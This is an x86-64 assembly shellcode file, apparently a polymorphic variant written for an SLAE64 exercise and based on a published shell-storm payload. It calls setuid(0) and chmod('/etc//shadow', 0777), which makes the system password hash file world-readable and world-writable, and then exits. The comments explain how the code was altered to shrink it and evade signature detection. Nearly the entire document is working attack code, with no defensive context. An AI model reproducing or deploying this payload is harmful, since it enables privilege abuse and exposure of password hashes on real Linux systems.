; setuid(0) & chmod("/etc/passwd", 0777) & exit(0) - 63 bytes
;
; Original Author:	Jonathan Salwan
; Original URL:		http://www.shell-storm.org/shellcode/files/shellcode-652.php
; Date:			2010-06-17
;
; Polymorph'd by Gitsnik SLAE64-1232
;
; Actually mods /etc/shadow :)
;
; Original Size: 63 bytes
; Polymorph Size: 51 bytes (80.95% of original)
;
; 3/19 lines same (15.79%) - syscalls only. Near total polymorph.
; I say near because I *did not* xor or or or and the /etc/shadow
; string, I simply changed the string a little. Mostly the code
; changes have been to make better use of registers or use smaller
; instructions.
;
bits 64

global _start

section .text

_start:
	; setuid(0)
	xor rcx, rcx		; Null RCX, RAX, and RDX
	mul rcx

	mov rdi, rcx		; Null RDI
	mov rsi, rdi		; Null RSI

	add al, 0x69
	syscall			; same

	; chmod("/etc//shadow", 0777)
	; No XOR's here, too few bytes to shave already :)
	;
	; Just add the extra / to shadow and fix the need
	; for shr. Then use rcx instead of rbx because I'm
	; being lazy.
	;
	add si, 0x01ff
	mov ecx, 0x776f6461
	push rcx
	mov rcx, 0x68732f2f6374652f
	push rcx

	push rsp
	pop rdi

	add al, 0x5a
	syscall			; same

	; exit(0)
	mov rdi, rdx
	add al, 0x3c
	syscall			; same

